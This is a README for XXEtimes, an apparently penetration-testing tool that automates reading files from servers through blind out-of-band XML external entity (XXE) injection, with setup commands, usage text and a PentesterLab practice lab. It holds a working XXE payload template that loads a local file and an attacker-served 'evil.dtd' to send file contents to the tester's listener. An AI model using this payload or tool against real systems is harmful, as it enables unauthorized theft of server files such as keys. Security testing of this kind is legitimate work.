# XXEtimes
XXEtimes is a self-contained PoC to make exploring and exfiltrating files through OOB XXE much quicker.

I come across blind XXE injection vulnerabilities quite a bit, and love using OOB techniques to read files and directory contents, but it's a very tedious process.

Usually it's a multi-step process that involves using Burp Suite Repeater to send the malicious request, a web server to serve up the crafted DTD file, and another listening server to capture the OOB HTTP request which contains file contents. And to change file or directory I have to manually modify the DTD and resend the request each time.

I got sick of the setup time and spinning up servers, so I wrote XXEtimes. Its aim is to be a self-contained tool to aid in data exfiltration once an OOB XXE injection has been discovered. It parses a request file from Burp, spins up a webserver, serves a DTD, and parses responses for file contents. It continually runs and lets you just type files or directories you want to exfiltrate.

See it in action here. I used it to browse home directories and find an unprotected key backup:

[![asciicast](https://asciinema.org/a/122903.png)](https://asciinema.org/a/122903)

## Setting Up
```
git clone https://github.com/ropnop/xxetimes.git
cd xxetimes
pip install requests
python xxetimes.py
```

The script requires a request file. Once you have found an XXE injection in Burp, export the request file to txt. Add the following DOCTYPE declaration to the request:

```
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{targetFilename}">
<!ENTITY % dtd SYSTEM "http://{xxeHelperServerInterface}:{xxeHelperServerPort}/evil.dtd">
%dtd;]>
```

The special params in "{}" are necessary for XXEtimes to work. There is an example request file in the repo. This works with the deliberately vulnerable [PlayXXE challenge](https://pentesterlab.com/exercises/play_xxe) from Pentesterlab if you want to test it.

## Usage

```
$ python xxetimes.py -h
usage: xxetimes.py [-h] -f REQUESTFILE [-p PORT] [-t TARGETHOST]
                   [-l LISTENPORT] -i INTERFACE

Local File Explorer Using XXE DTD Entity Expansion

optional arguments:
  -h, --help            show this help message and exit
  -f REQUESTFILE, --requestFile REQUESTFILE
                        Vulnerable request file with {targetFilename},
                        {xxeHelperServerInterface}, and {xxeHelperServerPort}
                        marked
  -p PORT, --port PORT  Port on target host (eg 80, 443)
  -t TARGETHOST, --targetHost TARGETHOST
                        Override host header in request file
  -l LISTENPORT, --listenPort LISTENPORT
                        Port for local DTD helper server
  -i INTERFACE, --listenIP INTERFACE
                        Bind IP address for local DTD helper server
```

It will likely require customization and tweaking for each specific vulnerability, but as long as the locations `{targetFilename}`, `{xxeHelperServerInterface}` and `{xxeHelperServerPort}` are present it should work.

Once you have your request file created with the appropriate injection points marked, fire it up with:

`python xxetimes.py -f request.txt -i <IP address to listen on>`

After the server spins up, simply type in the file or directory you wish to request (note: if the file doesn't exist or you don't have permissions, it will fail silently and display nothing)

On the backend, XXEtimes is customizing the "evil.dtd." file to define the `file` entity for what you enter. It then sends the malicious request, listens for the request for 'evil.dtd', serves up `evil.dtd`, listens for the subsequent request which contains the file contents in a URL parameter, then decodes file contents and displays it on screen.

To shutdown gracefully, enter `Ctrl-C`.



## Testing it out
Since I didn't want to write an actually vulnerable server, I've been testing with the "Play XXE" challenge ISO located here. 

<https://pentesterlab.com/exercises/play_xxe/course>

It's a bootable ISO you can run locally if you want to test it. It is vulnerable to XXE on the main login page, and the example request should work out of the box on it (as long as the IP address is updated!)


## Future plans
- [ ] Support history and "up arrow" completion
- [ ] Save files locally once they're retrieved
- [ ] Support other OOB methods like FTP
